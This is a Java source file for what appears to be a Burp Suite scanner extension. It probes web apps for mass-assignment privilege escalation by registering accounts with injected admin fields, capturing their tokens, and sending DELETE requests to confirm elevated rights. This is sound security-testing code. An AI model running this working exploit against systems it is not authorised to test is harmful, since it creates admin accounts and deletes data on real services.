package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.ui.ScanLog;

import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Mass-assignment / privilege-escalation-on-registration (CWE-915), confirmed by a PRIVILEGE DIFFERENTIAL.
 * Registers a NEW account M whose signup body carries injected privilege fields the client should never set
 * (admin/is_admin/role/is_staff/is_superuser), logs it in, then proves the field TOOK EFFECT: an admin-tier
 * action that our existing NORMAL session (N) is DENIED (401/403) SUCCEEDS (2xx) for M. Identical request, the
 * only difference being the injected field ⇒ zero-FP. The destructive verb (DELETE) targets throwaway accounts
 * WE register, so it never touches seeded or other-users' data.
 *
 * <p>Generic: the register/login shapes come from the two auth-candidate requests discovery already found; field
 * names are matched by category (username/password/email), not hardcoded; the user-collection + delete URL are
 * derived from the register path.</p>
 */
public final class MassAssignProbe {

    private final MontoyaApi api;
    private final ScanLog scanLog;

    private static final Pattern PASS  = Pattern.compile("(?i)\"(?:pass(?:word)?|pwd|passwd|secret|clave)\"\\s*:");
    private static final Pattern REG   = Pattern.compile("(?i)regist|sign-?up|create.?user");
    private static final Pattern LOGIN = Pattern.compile("(?i)log-?in|sign-?in|/auth|/token|/session");
    private static final String  PRIV  = "\"admin\":true,\"is_admin\":true,\"isAdmin\":true,\"role\":\"admin\",\"is_staff\":true,\"is_superuser\":true";
    private static final Pattern TOKEN_FIELD = Pattern.compile("(?i)\"(?:auth_?token|access_?token|id_?token|jwt|token|bearer)\"\\s*:\\s*\"([^\"\\n]{8,})\"");
    private static final Pattern JWT   = Pattern.compile("(eyJ[A-Za-z0-9_-]{6,}\\.[A-Za-z0-9_-]{6,}\\.[A-Za-z0-9_-]*)");

    public MassAssignProbe(MontoyaApi api, ScanLog scanLog) {
        this.api = api;
        this.scanLog = scanLog;
    }

    /** @param authCandidates login/register requests discovery surfaced (classified here by path + shape). */
    public int probe(String host, List<HttpRequest> authCandidates, String cookie, String bearer) {
        HttpRequest reg = null, login = null;
        for (HttpRequest q : candidates(host, authCandidates)) {
            String b = q.bodyToString();
            if (b == null || !b.trim().startsWith("{") || !PASS.matcher(b).find()) continue;
            if (reg == null && REG.matcher(q.path()).find()) reg = q;
            if (login == null && LOGIN.matcher(q.path()).find()) login = q;
        }
        if (reg == null || login == null) {
            scanLog.debug("[AI Scanner]   mass-assign: no JSON register/login pair observed — skipped");
            return 0;
        }
        scanLog.debug("[AI Scanner]   mass-assign: reg=" + reg.url() + " login=" + login.url());

        int n = Math.abs((host + reg.path()).hashCode() % 9000);
        String mUser = "aiscma" + n, nUser = "aiscmn" + n, sacA = "aiscsa" + n, sacB = "aiscsb" + n, pw = "AiscMa!" + n;
        // 1. register M (privilege-injected), a NORMAL control N, and two sacrificials — all our own throwaways.
        int mReg = status(register(reg, mUser, pw, true));
        int nReg = status(register(reg, nUser, pw, false));
        status(register(reg, sacA, pw, false));
        status(register(reg, sacB, pw, false));
        scanLog.debug("[AI Scanner]   mass-assign: register M(" + mUser + ")->HTTP " + mReg + ", N->HTTP " + nReg);
        if (mReg < 0 || mReg >= 400) return 0;                                   // registration rejected → can't test
        // 2. log BOTH M and the normal control N in (using their OWN tokens ⇒ a clean same-role-minus-priv diff).
        String tokenM = login(login, mUser, pw);
        String tokenN = login(login, nUser, pw);
        scanLog.debug("[AI Scanner]   mass-assign: tokens M=" + (tokenM != null) + " N=" + (tokenN != null));
        if (tokenM == null || tokenN == null) return 0;

        // 3. privilege differential on an admin-tier DELETE (derived user-collection + {id}): N denied, M allowed.
        String collRoot = reg.url().substring(0, reg.url().lastIndexOf('/'));   // …/register → …/users/v1
        int ns = status(send(HttpRequest.httpRequestFromUrl(collRoot + "/" + sacA).withMethod("DELETE"), null, null, tokenN));
        int ms = status(send(HttpRequest.httpRequestFromUrl(collRoot + "/" + sacB).withMethod("DELETE"), null, null, tokenM));
        scanLog.debug("[AI Scanner]   mass-assign: DELETE differential — N->HTTP " + ns + ", M->HTTP " + ms + " @ " + collRoot + "/{user}");
        if (ns >= 200 && ns < 300) return 0;                                     // normal N could ALSO do it ⇒ not a priv escalation (open/BFLA, not mass-assign)
        if (ms >= 200 && ms < 300) {
            HttpRequestResponse ev = send(HttpRequest.httpRequestFromUrl(collRoot + "/" + sacA).withMethod("DELETE"), null, null, tokenM);
            scanLog.found("Mass-assignment — privilege escalation on registration (CWE-915)", reg.url(),
                    "Registering with injected privilege field(s) (admin/is_admin/role/is_staff/is_superuser) produced an "
                    + "account that performs an admin-tier action — DELETE " + collRoot + "/{user} → HTTP " + ms + " — which "
                    + "our NORMAL session is DENIED (HTTP " + ns + "). The client-unsettable field elevated the account; "
                    + "same request, the only difference is the injected field (CWE-915, privilege escalation).",
                    ev != null ? ev : null);
            scanLog.incFinding();
            return 1;
        }
        return 0;
    }

    // ---- helpers ----

    private List<HttpRequest> candidates(String host, List<HttpRequest> authCandidates) {
        java.util.List<HttpRequest> out = new java.util.ArrayList<>();
        if (authCandidates != null) for (HttpRequest q : authCandidates)
            try { if ("POST".equals(q.method()) && host.equalsIgnoreCase(hostOf(q.url()))) out.add(q); } catch (Throwable ignore) { }
        try {
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                HttpRequest q = rr.request();
                if ("POST".equals(q.method()) && host.equalsIgnoreCase(hostOf(q.url()))) out.add(q);
            }
        } catch (Throwable ignore) { }
        return out;
    }

    private HttpRequestResponse register(HttpRequest tmpl, String user, String pass, boolean privileged) {
        String b = tmpl.bodyToString();
        b = setField(b, "username|user|login|userName|name|handle", user);
        b = setField(b, "password|pass|pwd|passwd|secret", pass);
        b = setField(b, "email|mail|e-?mail", user + "@example.com");
        if (privileged) {
            int c = b.lastIndexOf('}');
            if (c > 0) b = b.substring(0, c).replaceAll(",\\s*$", "") + "," + PRIV + "}";
        }
        return send(tmpl.withBody(b), null, null, null);
    }

    private String login(HttpRequest tmpl, String user, String pass) {
        String b = tmpl.bodyToString();
        b = setField(b, "username|user|login|userName|name|handle|email|mail", user);
        b = setField(b, "password|pass|pwd|passwd|secret", pass);
        HttpRequestResponse rr = send(tmpl.withBody(b), null, null, null);
        if (rr == null || rr.response() == null) return null;
        String rb = rr.response().bodyToString();
        if (rb == null) return null;
        Matcher t = TOKEN_FIELD.matcher(rb); if (t.find()) return t.group(1);
        Matcher j = JWT.matcher(rb);          if (j.find()) return j.group(1);
        return null;
    }

    private static String setField(String body, String namePat, String value) {
        Matcher m = Pattern.compile("(?i)(\"(?:" + namePat + ")\"\\s*:\\s*)\"[^\"\\n]*\"").matcher(body);
        return m.find() ? m.replaceFirst("$1\"" + Matcher.quoteReplacement(value) + "\"") : body;
    }

    private HttpRequestResponse send(HttpRequest req, String cookie, String bearer, String bearerM) {
        try {
            HttpRequest r = req;
            String bt = bearerM != null ? bearerM : bearer;
            if (cookie != null && !cookie.isBlank()) r = r.withHeader("Cookie", cookie);
            if (bt != null && !bt.isBlank()) r = r.withHeader("Authorization", "Bearer " + bt);
            return api.http().sendRequest(r, RequestOptions.requestOptions().withResponseTimeout(12000L));
        } catch (Throwable t) { return null; }
    }

    private static int status(HttpRequestResponse rr) {
        try { return rr != null && rr.response() != null ? rr.response().statusCode() : -1; } catch (Throwable t) { return -1; }
    }

    private static String hostOf(String url) { return Net.authority(url); }
}
